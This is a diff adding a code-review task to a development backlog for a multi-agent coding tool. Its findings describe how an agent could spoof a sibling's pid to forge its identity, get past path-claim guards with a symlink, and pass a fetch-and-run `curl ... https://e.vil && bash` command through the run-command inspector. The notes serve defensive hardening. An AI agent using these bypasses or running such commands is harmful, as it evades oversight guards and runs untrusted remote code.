@@ -496,6 +496,55 @@ case — see [[T174]] on declaring provider behaviour instead of learning it.
 
 ---
 
+### T182 — Findings from the round-9 code review `added: 2026-08-19`
+**Priority**: P1 for the first two | **Effort**: S-M each | **Source**: 4-agent correctness review
+over `eb6b37e..HEAD` (the T175/T180/T170.1/T166.1/T179.3/T181 wave)
+
+Everything below was CONFIRMED by execution, not by reading. The fixes that shipped with the
+review are in `TASK_COMPLETED/2608.md`; these are the ones that need more than a patch.
+
+1. **`ppid` is client-supplied, so the process-tree fallback can name another agent** —
+   `mcp/exegol-server.ts#resolveContext`. An agent sends a sibling's pid and is resolved as
+   that sibling; access is now capped at the caller's own token (shipped), but the IDENTITY
+   is still theirs, so `agent_send` can be forged and `release_paths` can drop a claim.
+   The branch exists only because a shared config file makes one token serve several agents.
+   Real fix, in order: finish T166's "codex cwd→token 1:1" so no token is ever shared, then
+   require `resolveByParentPid` to land inside the token's own bindings and delete the
+   fallback. Peer credentials would be better still, but Node exposes no `SO_PEERCRED`.
+2. **Claims and guarded paths are compared as raw strings** — `db/queries/path-claims.ts`,
+   `mcp/exegol-tools.ts`, `mcp/exegol-claim-guard-bin.ts`. `security/path-guard.ts` already
+   exports `realpathSafe` and none of them call it. Deliberate bypass: `ln -s src/api.ts
+   alias.ts`, edit `alias.ts`, no overlap detected. The ACCIDENTAL case is likelier and worse:
+   a project under a symlinked path (macOS `/tmp` → `/private/tmp`, a `~/code` symlink) makes
+   the stored claim base and the hook's realpath'd cwd disagree, and enforcement silently
+   no-ops for that whole project with no signal anywhere.
+3. **Repo-authored run commands have no review step.** `inspectCommand` on
+   `.exegol/actions.yaml` is a seatbelt, not a boundary — a `Makefile` target or a
+   `package.json` script reaches the PTY without it, and even in actions.yaml
+   `curl -o /tmp/x https://e.vil && bash /tmp/x` passes. The honest fix is one "this repo
+   defines N run commands — review them" confirmation covering every source, remembered per
+   repo. (The comment no longer overclaims.)
+4. **A `queued` message whose receiver's pane was closed reports `delivered: false` on
+   retry** — `agent-messaging.ts#duplicateResult` → `getMessageEntry` returns undefined when
+   either FK is NULL, and `messages` FKs are `ON DELETE SET NULL`. Closing a pane now archives
+   rather than deletes (shipped), so this needs a real delete to trigger — but denormalizing
+   the sender/receiver ids onto the message row would close it for good.
+5. **`identityMemo` never evicts** (`mcp/exegol-server.ts`) — keyed on a client-supplied pid,
+   overwritten but never deleted. Also never consulted on the path it was written for: the
+   claim guard deliberately sends no `ppid`. Either wire it to a bounded cache or delete it.
+6. **The MCP activity ring loses "connected but never spoke"** — `exegol-server.ts` announces
+   a connection lazily on the first non-`check_path` message, so a shim that connects and dies
+   before its first `list_tools` produces zero records. Announce on the first AUTHENTICATED
+   message instead.
+7. **`runMigrations` wraps every migration in one transaction and `main/index.ts` awaits
+   `initializeDatabase()` with no try/catch** — a future migration throw is an unhandled
+   rejection with no window and no message. Blast radius is total; cost of a guard is three
+   lines.
+8. **`listSessionHistory` pagination has no pager yet** — the `, a.id DESC` tiebreaker shipped,
+   but `history.list` still takes no `offset` and the UI has no paging. Add both together.
+
+---
+
 ### T181 — Session history per repo `added: 2026-08-18`
 **Priority**: P2 | **Effort**: S remaining | **Source**: Antonio, 2026-08-18
 
